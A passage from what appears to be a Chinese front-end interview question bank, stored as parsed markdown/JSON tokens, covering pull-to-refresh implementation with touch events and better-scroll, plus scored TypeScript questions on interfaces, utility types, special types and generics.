下拉刷新","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 下拉刷新","text":" 下拉刷新","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作","text":"下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作","tokens":[{"type":"text","raw":"下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作","text":"下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"关于下拉刷新的原生实现，主要分成三步：","text":"关于下拉刷新的原生实现，主要分成三步：","tokens":[{"type":"text","raw":"关于下拉刷新的原生实现，主要分成三步：","text":"关于下拉刷新的原生实现，主要分成三步：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；\\n- 监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；\\n- 监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；\\n","task":false,"loose":false,"text":"监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；","tokens":[{"type":"text","raw":"监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；","text":"监听原生`touchstart`事件，记录其初始位置的值，`e.touches[0].pageY`；","tokens":[{"type":"text","raw":"监听原生","text":"监听原生","escaped":false},{"type":"codespan","raw":"`touchstart`","text":"touchstart"},{"type":"text","raw":"事件，记录其初始位置的值，","text":"事件，记录其初始位置的值，","escaped":false},{"type":"codespan","raw":"`e.touches[0].pageY`","text":"e.touches[0].pageY"},{"type":"text","raw":"；","text":"；","escaped":false}]}]},{"type":"list_item","raw":"- 监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；\\n","task":false,"loose":false,"text":"监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","tokens":[{"type":"text","raw":"监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","text":"监听原生`touchmove`事件，记录并计算当前滑动的位置值与初始位置值的差值，大于`0`表示向下拉动，并借助CSS3的`translateY`属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","tokens":[{"type":"text","raw":"监听原生","text":"监听原生","escaped":false},{"type":"codespan","raw":"`touchmove`","text":"touchmove"},{"type":"text","raw":"事件，记录并计算当前滑动的位置值与初始位置值的差值，大于","text":"事件，记录并计算当前滑动的位置值与初始位置值的差值，大于","escaped":false},{"type":"codespan","raw":"`0`","text":"0"},{"type":"text","raw":"表示向下拉动，并借助CSS3的","text":"表示向下拉动，并借助CSS3的","escaped":false},{"type":"codespan","raw":"`translateY`","text":"translateY"},{"type":"text","raw":"属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","text":"属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；","escaped":false}]}]},{"type":"list_item","raw":"- 监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","task":false,"loose":false,"text":"监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","tokens":[{"type":"text","raw":"监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","text":"监听原生`touchend`事件，若此时元素滑动达到最大值，则触发`callback`，同时将`translateY`重设为`0`，元素回到初始位置","tokens":[{"type":"text","raw":"监听原生","text":"监听原生","escaped":false},{"type":"codespan","raw":"`touchend`","text":"touchend"},{"type":"text","raw":"事件，若此时元素滑动达到最大值，则触发","text":"事件，若此时元素滑动达到最大值，则触发","escaped":false},{"type":"codespan","raw":"`callback`","text":"callback"},{"type":"text","raw":"，同时将","text":"，同时将","escaped":false},{"type":"codespan","raw":"`translateY`","text":"translateY"},{"type":"text","raw":"重设为","text":"重设为","escaped":false},{"type":"codespan","raw":"`0`","text":"0"},{"type":"text","raw":"，元素回到初始位置","text":"，元素回到初始位置","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"举个例子：","text":"举个例子：","tokens":[{"type":"text","raw":"举个例子：","text":"举个例子：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"`Html`结构如下：","text":"`Html`结构如下：","tokens":[{"type":"codespan","raw":"`Html`","text":"Html"},{"type":"text","raw":"结构如下：","text":"结构如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n<main>\\n    <p class=\\"refreshText\\"></p >\\n    <ul id=\\"refreshContainer\\">\\n        <li>111</li>\\n        <li>222</li>\\n        <li>333</li>\\n        <li>444</li>\\n        <li>555</li>\\n        ...\\n    </ul>\\n</main>\\n```","lang":"js","text":"<main>\\n    <p class=\\"refreshText\\"></p >\\n    <ul id=\\"refreshContainer\\">\\n        <li>111</li>\\n        <li>222</li>\\n        <li>333</li>\\n        <li>444</li>\\n        <li>555</li>\\n        ...\\n    </ul>\\n</main>"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"监听`touchstart`事件，记录初始的值","text":"监听`touchstart`事件，记录初始的值","tokens":[{"type":"text","raw":"监听","text":"监听","escaped":false},{"type":"codespan","raw":"`touchstart`","text":"touchstart"},{"type":"text","raw":"事件，记录初始的值","text":"事件，记录初始的值","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nvar _element = document.getElementById(\'refreshContainer\'),\\n    _refreshText = document.querySelector(\'.refreshText\'),\\n    _startPos = 0,  // 初始的值\\n    _transitionHeight = 0; // 移动的距离\\n\\n_element.addEventListener(\'touchstart\', function(e) {\\n    _startPos = e.touches[0].pageY; // 记录初始位置\\n    _element.style.position = \'relative\';\\n    _element.style.transition = \'transform 0s\';\\n}, false);\\n```","lang":"js","text":"var _element = document.getElementById(\'refreshContainer\'),\\n    _refreshText = document.querySelector(\'.refreshText\'),\\n    _startPos = 0,  // 初始的值\\n    _transitionHeight = 0; // 移动的距离\\n\\n_element.addEventListener(\'touchstart\', function(e) {\\n    _startPos = e.touches[0].pageY; // 记录初始位置\\n    _element.style.position = \'relative\';\\n    _element.style.transition = \'transform 0s\';\\n}, false);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"监听`touchmove`移动事件，记录滑动差值","text":"监听`touchmove`移动事件，记录滑动差值","tokens":[{"type":"text","raw":"监听","text":"监听","escaped":false},{"type":"codespan","raw":"`touchmove`","text":"touchmove"},{"type":"text","raw":"移动事件，记录滑动差值","text":"移动事件，记录滑动差值","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n_element.addEventListener(\'touchmove\', function(e) {\\n    // e.touches[0].pageY 当前位置\\n    _transitionHeight = e.touches[0].pageY - _startPos; // 记录差值\\n\\n    if (_transitionHeight > 0 && _transitionHeight < 60) { \\n        _refreshText.innerText = \'下拉刷新\'; \\n        _element.style.transform = \'translateY(\'+_transitionHeight+\'px)\';\\n\\n        if (_transitionHeight > 55) {\\n            _refreshText.innerText = \'释放更新\';\\n        }\\n    }                \\n}, false);\\n```","lang":"js","text":"_element.addEventListener(\'touchmove\', function(e) {\\n    // e.touches[0].pageY 当前位置\\n    _transitionHeight = e.touches[0].pageY - _startPos; // 记录差值\\n\\n    if (_transitionHeight > 0 && _transitionHeight < 60) { \\n        _refreshText.innerText = \'下拉刷新\'; \\n        _element.style.transform = \'translateY(\'+_transitionHeight+\'px)\';\\n\\n        if (_transitionHeight > 55) {\\n            _refreshText.innerText = \'释放更新\';\\n        }\\n    }                \\n}, false);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"最后，就是监听`touchend`离开的事件","text":"最后，就是监听`touchend`离开的事件","tokens":[{"type":"text","raw":"最后，就是监听","text":"最后，就是监听","escaped":false},{"type":"codespan","raw":"`touchend`","text":"touchend"},{"type":"text","raw":"离开的事件","text":"离开的事件","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n_element.addEventListener(\'touchend\', function(e) {\\n    _element.style.transition = \'transform 0.5s ease 1s\';\\n    _element.style.transform = \'translateY(0px)\';\\n    _refreshText.innerText = \'更新中...\';\\n    // todo...\\n\\n}, false);\\n```","lang":"js","text":"_element.addEventListener(\'touchend\', function(e) {\\n    _element.style.transition = \'transform 0.5s ease 1s\';\\n    _element.style.transform = \'translateY(0px)\';\\n    _refreshText.innerText = \'更新中...\';\\n    // todo...\\n\\n}, false);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"从上面可以看到，在下拉到松手的过程中，经历了三个阶段：","text":"从上面可以看到，在下拉到松手的过程中，经历了三个阶段：","tokens":[{"type":"text","raw":"从上面可以看到，在下拉到松手的过程中，经历了三个阶段：","text":"从上面可以看到，在下拉到松手的过程中，经历了三个阶段：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作\\n- 下拉到一定值时，显示松手释放后的操作提示\\n- 下拉到达设定最大值松手时，执行回调，提示正在进行更新操作\\n\\n- **2：** 案例","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作\\n","task":false,"loose":true,"text":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","tokens":[{"type":"text","raw":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","text":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","tokens":[{"type":"text","raw":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","text":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","escaped":false}]}]},{"type":"list_item","raw":"- 下拉到一定值时，显示松手释放后的操作提示\\n","task":false,"loose":true,"text":"下拉到一定值时，显示松手释放后的操作提示","tokens":[{"type":"text","raw":"下拉到一定值时，显示松手释放后的操作提示","text":"下拉到一定值时，显示松手释放后的操作提示","tokens":[{"type":"text","raw":"下拉到一定值时，显示松手释放后的操作提示","text":"下拉到一定值时，显示松手释放后的操作提示","escaped":false}]}]},{"type":"list_item","raw":"- 下拉到达设定最大值松手时，执行回调，提示正在进行更新操作\\n\\n","task":false,"loose":true,"text":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作\\n","tokens":[{"type":"text","raw":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作\\n","text":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作","tokens":[{"type":"text","raw":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作","text":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 案例","task":false,"loose":true,"text":"**2：** 案例","tokens":[{"type":"text","raw":"**2：** 案例","text":"**2：** 案例","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 案例","text":" 案例","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在实际开发中，我们更多的是使用第三方库，下面以`better-scroll`进行举例：","text":"在实际开发中，我们更多的是使用第三方库，下面以`better-scroll`进行举例：","tokens":[{"type":"text","raw":"在实际开发中，我们更多的是使用第三方库，下面以","text":"在实际开发中，我们更多的是使用第三方库，下面以","escaped":false},{"type":"codespan","raw":"`better-scroll`","text":"better-scroll"},{"type":"text","raw":"进行举例：","text":"进行举例：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"HTML结构","text":"HTML结构","tokens":[{"type":"text","raw":"HTML结构","text":"HTML结构","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n<div id=\\"position-wrapper\\">\\n    <div>\\n        <p class=\\"refresh\\">下拉刷新</p >\\n        <div class=\\"position-list\\">\\n   <!--列表内容-->\\n        </div>\\n        <p class=\\"more\\">查看更多</p >\\n    </div>\\n</div>\\n```","lang":"js","text":"<div id=\\"position-wrapper\\">\\n    <div>\\n        <p class=\\"refresh\\">下拉刷新</p >\\n        <div class=\\"position-list\\">\\n   <!--列表内容-->\\n        </div>\\n        <p class=\\"more\\">查看更多</p >\\n    </div>\\n</div>"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"实例化上拉下拉插件，通过`use`来注册插件","text":"实例化上拉下拉插件，通过`use`来注册插件","tokens":[{"type":"text","raw":"实例化上拉下拉插件，通过","text":"实例化上拉下拉插件，通过","escaped":false},{"type":"codespan","raw":"`use`","text":"use"},{"type":"text","raw":"来注册插件","text":"来注册插件","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport BScroll from \\"@better-scroll/core\\";\\nimport PullDown from \\"@better-scroll/pull-down\\";\\nimport PullUp from \'@better-scroll/pull-up\';\\nBScroll.use(PullDown);\\nBScroll.use(PullUp);\\n```","lang":"js","text":"import BScroll from \\"@better-scroll/core\\";\\nimport PullDown from \\"@better-scroll/pull-down\\";\\nimport PullUp from \'@better-scroll/pull-up\';\\nBScroll.use(PullDown);\\nBScroll.use(PullUp);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"实例化`BetterScroll`，并传入相关的参数","text":"实例化`BetterScroll`，并传入相关的参数","tokens":[{"type":"text","raw":"实例化","text":"实例化","escaped":false},{"type":"codespan","raw":"`BetterScroll`","text":"BetterScroll"},{"type":"text","raw":"，并传入相关的参数","text":"，并传入相关的参数","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nlet pageNo = 1,pageSize = 10,dataList = [],isMore = true;  \\nvar scroll= new BScroll(\\"#position-wrapper\\",{\\n    scrollY:true,//垂直方向滚动\\n    click:true,//默认会阻止浏览器的原生click事件，如果需要点击，这里要设为true\\n    pullUpLoad:true,//上拉加载更多\\n    pullDownRefresh:{\\n        threshold:50,//触发pullingDown事件的位置\\n        stop:0//下拉回弹后停留的位置\\n    }\\n});\\n//监听下拉刷新\\nscroll.on(\\"pullingDown\\",pullingDownHandler);\\n//监测实时滚动\\nscroll.on(\\"scroll\\",scrollHandler);\\n//上拉加载更多\\nscroll.on(\\"pullingUp\\",pullingUpHandler);\\n\\nasync function pullingDownHandler(){\\n    dataList=[];\\n    pageNo=1;\\n    isMore=true;\\n    $(\\".more\\").text(\\"查看更多\\");\\n    await getlist();//请求数据\\n    scroll.finishPullDown();//每次下拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作\\n}\\nasync function pullingUpHandler(){\\n    if(!isMore){\\n        $(\\".more\\").text(\\"没有更多数据了\\");\\n        scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n        return;\\n    }\\n    pageNo++;\\n    await this.getlist();//请求数据\\n    scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作    \\n}\\nfunction scrollHandler(){\\n    if(this.y>50) $(\'.refresh\').text(\\"松手开始加载\\");\\n    else $(\'.refresh\').text(\\"下拉刷新\\");\\n}\\nfunction getlist(){\\n    //返回的数据\\n    let result=....;\\n    dataList=dataList.concat(result);\\n    //判断是否已加载完\\n    if(result.length<pageSize) isMore=false;\\n    //将dataList渲染到html内容中\\n}    \\n```","lang":"js","text":"let pageNo = 1,pageSize = 10,dataList = [],isMore = true;  \\nvar scroll= new BScroll(\\"#position-wrapper\\",{\\n    scrollY:true,//垂直方向滚动\\n    click:true,//默认会阻止浏览器的原生click事件，如果需要点击，这里要设为true\\n    pullUpLoad:true,//上拉加载更多\\n    pullDownRefresh:{\\n        threshold:50,//触发pullingDown事件的位置\\n        stop:0//下拉回弹后停留的位置\\n    }\\n});\\n//监听下拉刷新\\nscroll.on(\\"pullingDown\\",pullingDownHandler);\\n//监测实时滚动\\nscroll.on(\\"scroll\\",scrollHandler);\\n//上拉加载更多\\nscroll.on(\\"pullingUp\\",pullingUpHandler);\\n\\nasync function pullingDownHandler(){\\n    dataList=[];\\n    pageNo=1;\\n    isMore=true;\\n    $(\\".more\\").text(\\"查看更多\\");\\n    await getlist();//请求数据\\n    scroll.finishPullDown();//每次下拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作\\n}\\nasync function pullingUpHandler(){\\n    if(!isMore){\\n        $(\\".more\\").text(\\"没有更多数据了\\");\\n        scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n        return;\\n    }\\n    pageNo++;\\n    await this.getlist();//请求数据\\n    scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作    \\n}\\nfunction scrollHandler(){\\n    if(this.y>50) $(\'.refresh\').text(\\"松手开始加载\\");\\n    else $(\'.refresh\').text(\\"下拉刷新\\");\\n}\\nfunction getlist(){\\n    //返回的数据\\n    let result=....;\\n    dataList=dataList.concat(result);\\n    //判断是否已加载完\\n    if(result.length<pageSize) isMore=false;\\n    //将dataList渲染到html内容中\\n}    "},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注意点：","text":"注意点：","tokens":[{"type":"text","raw":"注意点：","text":"注意点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用 `better-scroll` 实现下拉刷新、上拉加载时要注意以下几点：","text":"使用 `better-scroll` 实现下拉刷新、上拉加载时要注意以下几点：","tokens":[{"type":"text","raw":"使用 ","text":"使用 ","escaped":false},{"type":"codespan","raw":"`better-scroll`","text":"better-scroll"},{"type":"text","raw":" 实现下拉刷新、上拉加载时要注意以下几点：","text":" 实现下拉刷新、上拉加载时要注意以下几点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `wrapper` 里必须只有一个子元素\\n- 子元素的高度要比 `wrapper` 要高\\n- 使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`\\n- 滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`\\n- 上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作\\n- `better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- `wrapper` 里必须只有一个子元素\\n","task":false,"loose":false,"text":"`wrapper` 里必须只有一个子元素","tokens":[{"type":"text","raw":"`wrapper` 里必须只有一个子元素","text":"`wrapper` 里必须只有一个子元素","tokens":[{"type":"codespan","raw":"`wrapper`","text":"wrapper"},{"type":"text","raw":" 里必须只有一个子元素","text":" 里必须只有一个子元素","escaped":false}]}]},{"type":"list_item","raw":"- 子元素的高度要比 `wrapper` 要高\\n","task":false,"loose":false,"text":"子元素的高度要比 `wrapper` 要高","tokens":[{"type":"text","raw":"子元素的高度要比 `wrapper` 要高","text":"子元素的高度要比 `wrapper` 要高","tokens":[{"type":"text","raw":"子元素的高度要比 ","text":"子元素的高度要比 ","escaped":false},{"type":"codespan","raw":"`wrapper`","text":"wrapper"},{"type":"text","raw":" 要高","text":" 要高","escaped":false}]}]},{"type":"list_item","raw":"- 使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`\\n","task":false,"loose":false,"text":"使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`","tokens":[{"type":"text","raw":"使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`","text":"使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`","tokens":[{"type":"text","raw":"使用的时候，要确定 ","text":"使用的时候，要确定 ","escaped":false},{"type":"codespan","raw":"`DOM`","text":"DOM"},{"type":"text","raw":" 元素是否已经生成，必须要等到 ","text":" 元素是否已经生成，必须要等到 ","escaped":false},{"type":"codespan","raw":"`DOM`","text":"DOM"},{"type":"text","raw":" 渲染完成后，再 ","text":" 渲染完成后，再 ","escaped":false},{"type":"codespan","raw":"`new BScroll()`","text":"new BScroll()"}]}]},{"type":"list_item","raw":"- 滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`\\n","task":false,"loose":false,"text":"滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`","tokens":[{"type":"text","raw":"滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`","text":"滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`","tokens":[{"type":"text","raw":"滚动区域的 ","text":"滚动区域的 ","escaped":false},{"type":"codespan","raw":"`DOM`","text":"DOM"},{"type":"text","raw":" 元素结构有变化后，需要执行刷新 ","text":" 元素结构有变化后，需要执行刷新 ","escaped":false},{"type":"codespan","raw":"`refresh()`","text":"refresh()"}]}]},{"type":"list_item","raw":"- 上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作\\n","task":false,"loose":false,"text":"上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作","tokens":[{"type":"text","raw":"上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作","text":"上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作","tokens":[{"type":"text","raw":"上拉或者下拉，结束后，需要执行 ","text":"上拉或者下拉，结束后，需要执行 ","escaped":false},{"type":"codespan","raw":"`finishPullUp()`","text":"finishPullUp()"},{"type":"text","raw":" 或者 ","text":" 或者 ","escaped":false},{"type":"codespan","raw":"`finishPullDown()`","text":"finishPullDown()"},{"type":"text","raw":"，否则将不会执行下次操作","text":"，否则将不会执行下次操作","escaped":false}]}]},{"type":"list_item","raw":"- `better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","task":false,"loose":false,"text":"`better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","tokens":[{"type":"text","raw":"`better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","text":"`better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","tokens":[{"type":"codespan","raw":"`better-scroll`","text":"better-scroll"},{"type":"text","raw":"，默认会阻止浏览器的原生 ","text":"，默认会阻止浏览器的原生 ","escaped":false},{"type":"codespan","raw":"`click`","text":"click"},{"type":"text","raw":" 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 ","text":" 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 ","escaped":false},{"type":"codespan","raw":"`click:true`","text":"click:true"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n","pre":false,"text":"</details>\\n"}]},{"key":"TypeScript","content":"<h1>TypeScript</h1>\\n<h2>ts 如何定义对象结构体</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">interface Person {\\n    name: string;\\n    age: number;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> type 也可以用于定义类型</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">type Person = {\\n    name: string;\\n    age: number;\\n}\\n</code></pre>\\n<h2>type 和 interface的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> interface 可以重复声明，type 不行</li>\\n<li><strong>1：</strong> 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好</li>\\n<li>建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。</li>\\n</ul>\\n</details>\\n\\n<h2>常用工具类型？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> Partial：满足部分属性(一个都没满足也可)即可</li>\\n<li><strong>1：</strong> Required：所有属性都需要</li>\\n<li><strong>1：</strong> Readonly: 包装后的所有属性只读</li>\\n<li><strong>1：</strong> Pick: 选取部分属性</li>\\n<li><strong>1：</strong> Omit: 去除部分属性</li>\\n<li><strong>1：</strong> Extract: 交集</li>\\n<li><strong>1：</strong> Exclude: 差集</li>\\n</ul>\\n</details>\\n\\n<h2>any、never、unknown、null &amp; undefined 和 void 有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> any: 动态的变量类型（失去了类型检查的作用）</li>\\n<li><strong>1：</strong> never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型</li>\\n<li><strong>1：</strong> unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型</li>\\n<li><strong>1：</strong> null &amp; undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自</li>\\n<li><strong>1：</strong> void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void</li>\\n</ul>\\n</details>\\n\\n<h2>?.、??、!、!.、_、** 等符号的含义？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> ?. 可选链 遇到 null 和 undefined 可以立即停止表达式的运行</li>\\n<li><strong>1：</strong> ?? 空值合并运算符 当左侧操作数为 null 或 undefined 时，其返回右侧的操作数，否则返回左侧的操作数</li>\\n<li><strong>1：</strong> ! 非空断言运算符 x! 将从 x 值域中排除 null 和 undefined</li>\\n<li><strong>1：</strong> !. 在变量名后添加，可以断言排除undefined和null类型</li>\\n<li><strong>1：</strong> _数字分割符 分隔符不会改变数值字面量的值，使人更容易读懂数字 .e.g 1_101_324</li>\\n<li><strong>1：</strong> ** 求幂</li>\\n</ul>\\n</details>\\n\\n<h2>请解释一下 TypeScript 中的基本数据类型有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>\\nTypeScript 的基本数据类型包括：number（数字，包括整数和浮点数）、string（字符串）、boolean（布尔值，只有true和false）、null（表示空值）、undefined（表示未定义）、symbol（ES6 新增的一种原始数据类型，用于表示独一无二的值）和bigint（用于表示任意精度的整数）</li>\\n</ul>\\n<h2>什么是泛型,有什么作用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在定义某些函数、接口和类时，不写死类型，而是改用类型参数的形式，让类型更加灵活。</li>\\n</ul>\\n<details>\\n\\n<pre><code class=\\"language-typescript\\">\\ninterface IResponseData&lt;T&gt;{\\n    code: number;\\n    message?: string;\\n    data: T;\\n}\\n\\n\\ninterface User {\\n  id: number;\\n  name: string;\\n  email: string;\\n}\\n\\n// 使用时传入User类型\\nconst response: IResponseData&lt;User&gt; = {\\n  code: 200,\\n  message: &quot;Success&quot;,\\n  data: {\\n    id: 1,\\n    name: &quot;xiaoming&quot;,\\n    email: &quot;xxx@qq.com&quot;\\n  